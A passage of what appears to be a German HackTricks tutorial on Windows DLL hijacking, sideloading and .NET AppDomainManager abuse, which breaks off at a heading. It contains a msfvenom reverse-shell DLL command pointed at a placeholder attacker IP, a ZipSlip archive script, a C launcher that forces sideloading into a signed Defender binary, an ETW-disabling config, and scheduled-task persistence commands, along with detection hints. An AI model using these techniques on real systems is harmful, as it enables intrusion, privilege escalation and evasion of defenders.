# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking bedeutet, eine vertrauenswürdige Anwendung dazu zu bringen, eine bösartige DLL zu laden. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Die Methode wird hauptsächlich zur Codeausführung und zur Erreichung von Persistenz eingesetzt und seltener zur Rechteausweitung. Obwohl hier der Schwerpunkt auf der Rechteausweitung liegt, bleibt die Hijacking-Methode bei allen Zielen dieselbe.

### Gängige Techniken

Für DLL Hijacking kommen mehrere Methoden zum Einsatz. Wie effektiv sie sind, hängt von der DLL-Ladestrategie der Anwendung ab:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Eine echte DLL wird durch eine bösartige ersetzt. Optional kann DLL Proxying verwendet werden, um die Funktionalität der ursprünglichen DLL beizubehalten.
2. **DLL Search Order Hijacking**: Die bösartige DLL wird in einem Suchpfad vor der legitimen platziert. Dabei wird das Suchmuster der Anwendung ausgenutzt.
3. **Phantom DLL Hijacking**: Eine bösartige DLL wird erstellt, die eine Anwendung zu laden versucht, weil sie davon ausgeht, dass es sich um eine benötigte, aber nicht vorhandene DLL handelt.
4. **DLL Redirection**: Suchparameter wie `%PATH%` oder `.exe.manifest`- bzw. `.exe.local`-Dateien werden geändert, um die Anwendung zur bösartigen DLL zu leiten.
5. **WinSxS DLL Replacement**: Die legitime DLL wird im WinSxS-Verzeichnis durch eine bösartige Variante ersetzt. Diese Methode wird häufig mit DLL side-loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Die bösartige DLL wird in einem benutzergesteuerten Verzeichnis zusammen mit der kopierten Anwendung platziert. Das ähnelt Binary Proxy Execution-Techniken.

Eine Anwendung kann auch **einen eigenen DLL-Loader** implementieren. Ein privilegierter Prozess kann ein Unterverzeichnis wie `Libraries` oder `Plugins` auflisten und eine ausgewählte DLL an einen Hilfsprozess übergeben, unabhängig von der normalen Windows-DLL-Suchreihenfolge. Wenn ein anderes Konto Dateien in genau diesem Verzeichnis erstellen kann, sollte dies als Ansatzpunkt für eine Untersuchung betrachtet werden: Identität des Prozesses, effektive ACL des Verzeichnisses, Dateiauswahlregel und erreichbarer Ladevorgang müssen bestätigt werden. Ein beschreibbares Verzeichnis neben einer ausführbaren Datei belegt nicht, dass der Prozess DLLs daraus lädt.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassisches DLL sideloading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Angreifercode zu laden. Ist die Zieldatei eine **verwaltete** Anwendung, berücksichtigt die CLR auch eine **Anwendungskonfigurationsdatei** mit dem Namen der ausführbaren Datei (zum Beispiel `Setup.exe.config`). In dieser Datei kann ein benutzerdefinierter **AppDomainManager** festgelegt werden. Verweist die Konfiguration auf eine vom Angreifer kontrollierte Assembly neben der EXE, lädt die CLR diese **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.<sup>[[24]](#references)</sup>

Laut dem Konfigurationsschema von Microsoft für .NET Framework müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimaler Manager:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktische Hinweise:
- Diese Technik ist **spezifisch für .NET Framework**. Sie basiert auf dem Parsen der CLR-Konfiguration, nicht auf der Win32-DLL-Suchreihenfolge.
- Beim Host muss es sich tatsächlich um eine **managed EXE** handeln. Schnelle Prüfung: `sigcheck -m target.exe`, `corflags target.exe` oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
- Der Name der Konfigurationsdatei muss exakt dem Namen der ausführbaren Datei entsprechen (`<binary>.config`) und sie befindet sich normalerweise **neben der EXE**.
- Das ist bei **signierten Microsoft-/Vendor-Binärdateien** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed Assembly prozessintern ausgeführt wird.
- Wenn du bereits über ein beschreibbares Installer-/Update-Verzeichnis verfügst, kann AppDomainManager-Hijacking als **erste Stufe** eingesetzt werden, gefolgt von klassischem DLL-Sideloading oder Reflective Loading für spätere Stufen.

### AppDomainManager als Downloader und Bootstrap für geplante Tasks

Ein praktisches Intrusion-Muster besteht darin, die vertrauenswürdige managed EXE mit einer bösartigen `*.config` und einer bösartigen AppDomainManager-DLL zu kombinieren, die nur als **kleiner Bootstrapper** dient:<sup>[[25]](#references)</sup>

1. Ein Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die benachbarte Konfigurationsdatei veranlasst die CLR, die Assembly des Angreifers zu laden, **bevor** die legitime App-Logik startet.
3. Der bösartige Manager führt eine **Pfadprüfung** durch (zum Beispiel nur fortfahren, wenn die Host-EXE aus `Downloads` läuft, und die Ausführung der zweiten Stufe nur aus `%LOCALAPPDATA%` zulassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die eigentliche Payload in einen benutzerbeschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet mit einem geplanten Task Persistenz ein.

Warum diese Variante wichtig ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, die nur den Hash der Hauptbinärdatei prüft, die Kompromittierung möglicherweise nicht erkennt.
- Einfaches **pfadbasiertes Anti-Analysis** ist verbreitet: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, in einen Temp-Ordner oder in einen Sandbox-Pfad kann die Angriffskette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein bleiben und wenig auffallen, während das eigentliche Implantat später abgerufen wird.

Minimales Persistenzbeispiel, das häufig bei diesem Muster zu sehen ist:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Hinweise:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigungsstufe** für diesen Benutzer/diese Sitzung; es garantiert für sich genommen keine Eskalation zu SYSTEM.
- Diese Technik lässt sich oft besser als **Ausführung/Persistenz durch Missbrauch der .NET-Konfiguration** einordnen denn als klassisches Hijacking der DLL-Suchreihenfolge aufgrund einer fehlenden DLL, auch wenn Operatoren beides häufig miteinander verknüpfen.

Erkennungshinweise:
- Signierte .NET-Executables, die aus **ZIP-Entpackungsverzeichnissen**, `Downloads`, `%TEMP%` oder anderen benutzerschreibbaren Verzeichnissen gestartet werden und neben denen sich eine `<exe>.config` befindet.
- Neue geplante Tasks, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser- oder Hersteller-Updatern ähneln.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort ein weiteres EXE herunterladen und danach `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, wenn der Pfad des Executables nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Eine vorhandene geplante Aufgabe hijacken, um die Sideloading-Kette erneut zu starten

Suche bei der Persistenz nicht nur nach dem **Erstellen einer neuen Aufgabe**. Manche Intrusion-Sets warten, bis ein legitimer Installer eine **normale Updater-Aufgabe** erstellt, und **schreiben dann die Aufgabenaktion um**, sodass Name, Autor und Trigger für Verteidiger vertraut bleiben.

Wiederverwendbarer Workflow:
1. Installiere/führe die legitime Software aus und ermittle die Aufgabe, die sie normalerweise erstellt.
2. Exportiere das Aufgaben-XML und notiere die aktuellen Werte für `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetze nur die Aktion, sodass die Aufgabe dein **vertrauenswürdiges Host-EXE** aus einem benutzerschreibbaren Staging-Verzeichnis startet, das anschließend die echte Payload per Side-Loading oder AppDomain lädt.
4. Registriere denselben Aufgabennamen erneut, anstatt ein neues, offensichtliches Persistenz-Artefakt zu erstellen.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim wirken (zum Beispiel wie der eines Anbieter-Updaters).
- Der **Task Scheduler-Dienst** startet den Prozess. Daher sieht die Validierung von Eltern- und Vorfahrenprozessen oft die erwartete Aufgabenplanungskette statt `explorer.exe`.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, übersehen möglicherweise eine Aufgabe, deren Registrierung bereits vorhanden war, deren Aktion jetzt aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Suchansätze:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erstelle einen Alarm, wenn eine **wie ein Anbieter-Updater wirkende Aufgabe** aus **benutzerbeschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine Schritt-für-Schritt-Kette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL-Sideloading kombiniert, findest du im folgenden Workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und **die folgenden zwei Filter zu setzen**:

![Gängige Techniken – Fehlende DLLs finden: Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, procmon von Sysinternals auszuführen und die folgenden zwei Filter zu setzen](<../../../images/image (961).png>)

![Gängige Techniken – Fehlende DLLs finden: Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, procmon von Sysinternals auszuführen und die folgenden zwei Filter zu setzen](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Gängige Techniken – Fehlende DLLs finden: und nur die File System Activity anzuzeigen](<../../../images/image (153).png>)

Wenn du **generell nach fehlenden DLLs** suchst, lässt du das Programm einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchst, setzt du einen weiteren Filter wie **"Process Name" "contains" `<exec name>`**, führst die Datei aus und beendest dann die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um deine Berechtigungen zu erweitern, suche nach einer **DLL, die ein privilegierter Prozess von einem beschreibbaren Speicherort zu laden versucht**. Das kann passieren, wenn du ein Verzeichnis kontrollierst, das vor dem Verzeichnis mit der legitimen DLL durchsucht wird, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du, wie DLLs genau geladen werden.**

**Windows-Anwendungen** suchen anhand einer Reihe **vordefinierter Suchpfade** in einer festgelegten Reihenfolge nach DLLs. DLL-Hijacking wird möglich, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der legitimen DLL geladen wird. Um dies zu verhindern, sollte die Anwendung absolute Pfade für die von ihr benötigten DLLs verwenden.

Die **DLL-Suchreihenfolge auf 32-Bit-Systemen** ist wie folgt:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses abzurufen.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses abruft, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses abzurufen.
   1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die in der Umgebungsvariablen PATH aufgeführten Verzeichnisse. Beachte, dass der anwendungsspezifische Pfad, der im Registrierungsschlüssel **App Paths** angegeben ist, nicht dazugehört. Der Schlüssel **App Paths** wird bei der Ermittlung des DLL-Suchpfads nicht verwendet.

Dies ist die **standardmäßige** Suchreihenfolge bei aktiviertem **SafeDllSearchMode**. Ist diese Funktion deaktiviert, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wird die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Eine DLL kann schließlich statt über ihren Namen auch über einen absoluten Pfad geladen werden. In diesem Fall sucht Windows die DLL selbst nur an diesem Pfad. Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der jeweils geltenden Suchreihenfolge.

Es gibt noch weitere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erläutern.

### Einen beliebigen Dateischreibzugriff in ein Hijacking einer fehlenden DLL umwandeln

**Verwandte Technik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, nach denen der Prozess sucht, die er aber nicht finden kann.<sup>[[14]](#references)</sup>
2. Wird die Binärdatei **zeitgesteuert oder als Dienst** ausgeführt, wird eine DLL mit einem dieser Namen im **Anwendungsverzeichnis** (Eintrag Nr. 1 der Suchreihenfolge) beim nächsten Start geladen. In einem Fall mit einem .NET-Scanner suchte der Prozess in `C:\samples\app\` nach `hostfxr.dll`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein **beliebiger Schreibzugriff im ZipSlip-Stil** ist, erstelle eine ZIP-Datei mit einem Eintrag, der aus dem Entpackverzeichnis herausführt, sodass die DLL im Anwendungsordner landet:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Lege das Archiv im überwachten Posteingang/Share ab; wenn die geplante Aufgabe den Prozess erneut startet, lädt dieser die bösartige DLL und führt deinen Code als Dienstkonto aus.

### Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses gezielt zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS festzulegen. Wenn du hier ein vom Angreifer kontrolliertes Verzeichnis angibst, kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (ohne absoluten Pfad und ohne sichere Ladeflags), dazu gebracht werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Grundidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Zieldatei eine DLL anhand ihres Namens auflöst, berücksichtigt der Loader bei der Auflösung den angegebenen DllPath. So wird zuverlässiges Sideloading ermöglicht, selbst wenn sich die bösartige DLL nicht im selben Verzeichnis wie die Zieldatei befindet.

Hinweise/Einschränkungen
- Dies betrifft den erstellten Kindprozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder LoadLibrary dafür aufrufen (kein absoluter Pfad und weder LOAD_LIBRARY_SEARCH_SYSTEM32 noch SetDefaultDllDirectories verwenden).
- KnownDLLs und fest codierte absolute Pfade können nicht übernommen werden. Weitergeleitete Exporte und SxS können die Reihenfolge der Prioritäten ändern.

Minimales C-Beispiel (ntdll, Wide Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: DLL-Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Beispiel für die praktische Verwendung
- Lege eine schädliche xmllite.dll (die erforderlichen Funktionen exportierend oder an die echte DLL weiterleitend) in deinem DllPath-Verzeichnis ab.
- Starte eine signierte Binärdatei, von der bekannt ist, dass sie mithilfe der obigen Technik xmllite.dll anhand des Namens sucht. Der Loader löst den Import über den angegebenen DllPath auf und sideloadet deine DLL.

Diese Technik wurde in freier Wildbahn beobachtet, um mehrstufige Sideloading-Ketten anzutreiben: Ein initialer Launcher legt eine Hilfs-DLL ab, die anschließend eine von Microsoft signierte, hijackbare Binärdatei mit einem benutzerdefinierten DllPath startet, um das Laden der Angreifer-DLL aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager-Hijacking über `.exe.config`

Bei Zielen mit **.NET Framework** kann Sideloading **vor `Main()`** ohne Speicher-Patching erfolgen, indem die neben der Anwendung liegende **`.exe.config`**-Datei missbraucht wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, legt der Angreifer eine legitime .NET-EXE neben einer schädlichen Config-Datei und einer oder mehreren vom Angreifer kontrollierten Assemblies ab.

So funktioniert die Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE wird gestartet und die **CLR liest `<exe>.config`**.
2. Die Config legt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`** fest, sodass die Runtime einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der schädliche Manager erhält **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Config kann die CLR dazu zwingen, zuerst lokale Assemblies aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) und die Runtime-Validierung/-Telemetrie ohne Inline-Patching zu schwächen.

Muster im Stil einer Kampagne (die genaue Verschachtelung kann je nach Direktive/CLR-Version variieren):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Warum das nützlich ist:
- **`<probing privatePath="."/>`** beschränkt die Assembly-Auflösung auf das Anwendungsverzeichnis und macht den Ordner so zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in Angreifercode, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann einer Full-Trust-Anwendung ermöglichen, nicht signierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** verhindert Publisher-Policy-Umleitungen zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sorgt für eine deterministischere Runtime-Auswahl.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit über die Konfiguration deaktiviert**, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In aktuellen Kampagnen beobachtetes Vorgehen:
- Stufe 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Stufe 2 kopiert sie in einen glaubwürdig wirkenden **AppData-Update**-Ordner, benennt den Host beispielsweise in `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Stufe 3 überprüft den Ausführungskontext (zum Beispiel, ob der erwartete übergeordnete Prozess `svchost.exe` vom Task Scheduler ist), bevor die finale RAT-DLL/der finale Export geladen wird.

Ansätze für die Suche:
- Signierte oder anderweitig legitime **.NET-Executables**, die an verdächtigen Speicherorten mit Schreibzugriff für Benutzer nebenliegenden **`.config`**-Dateien ausgeführt werden.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen Verzeichnissen wie `\bin\update\` erneut starten.
- Prozessketten, in denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der unmittelbar danach nicht vom Hersteller stammende Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen bei der DLL-Suchreihenfolge laut Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge aufgeführt:

- Wird eine **DLL gefunden, deren Name mit dem einer bereits im Speicher geladenen DLL übereinstimmt**, umgeht das System die übliche Suche. Stattdessen prüft es, ob eine Umleitung und ein Manifest vorliegen, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario sucht das System nicht nach der DLL**.
- Wird eine DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt, verwendet das System die entsprechende Version der bekannten DLL zusammen mit allen zugehörigen abhängigen DLLs und **verzichtet auf den Suchvorgang**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- **Hat eine DLL Abhängigkeiten**, werden diese abhängigen DLLs so gesucht, als wären sie nur über ihre **Modulnamen** angegeben worden – unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad gefunden wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Einen Prozess identifizieren, der mit **anderen Privilegien** ausgeführt wird oder ausgeführt werden soll (horizontale oder laterale Bewegung) und dem eine **DLL fehlt**.
- Sicherstellen, dass **Schreibzugriff** auf ein beliebiges **Verzeichnis** besteht, in dem nach der **DLL** gesucht wird. Das kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Diese Voraussetzungen sind standardmäßig selten erfüllt: Privilegierte ausführbare Dateien haben normalerweise keine fehlenden DLL-Abhängigkeiten, und Standardbenutzer können üblicherweise nicht in Systemverzeichnisse schreiben, die durchsucht werden. Fehlkonfigurierte Umgebungen können jedoch beide Bedingungen erfüllen.\
Sind die Voraussetzungen erfüllt, prüfe das Projekt [UACME](https://github.com/hfiref0x/UACME). Obwohl dessen Hauptziel der UAC-Bypass ist, enthält es PoCs für DLL-Hijacking für bestimmte Windows-Versionen, die sich oft an das gefundene beschreibbare Verzeichnis anpassen lassen.

Beachte, dass du **deine Berechtigungen in einem Ordner überprüfen** kannst mit:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Du kannst auch die Imports einer ausführbaren Datei und die Exports einer DLL mit Folgendem überprüfen:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Für eine vollständige Anleitung, wie du **DLL Hijacking missbrauchst, um deine Berechtigungen zu erweitern**, wenn du Schreibberechtigungen für einen **System-PATH-Ordner** hast, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibberechtigungen für einen Ordner innerhalb des System-PATH hast.\
Weitere interessante automatisierte Tools zum Aufspüren dieser Schwachstelle sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Wenn du ein ausnutzbares Szenario findest, ist eines der wichtigsten Dinge für einen erfolgreichen Exploit, **eine DLL zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei daraus importiert**. Beachte jedoch, dass DLL Hijacking praktisch ist, um von **Medium Integrity** zu **High Integrity zu eskalieren (UAC zu umgehen)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie du eine gültige DLL erstellst**, findest du in dieser Studie zu DLL Hijacking für die Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnit**t einige **grundlegende DLL-Codes**, die als **Vorlagen** oder zum Erstellen einer **DLL mit nicht erforderlichen exportierten Funktionen** nützlich sein können.

## **DLLs erstellen und kompilieren**

### **DLL proxifizieren**

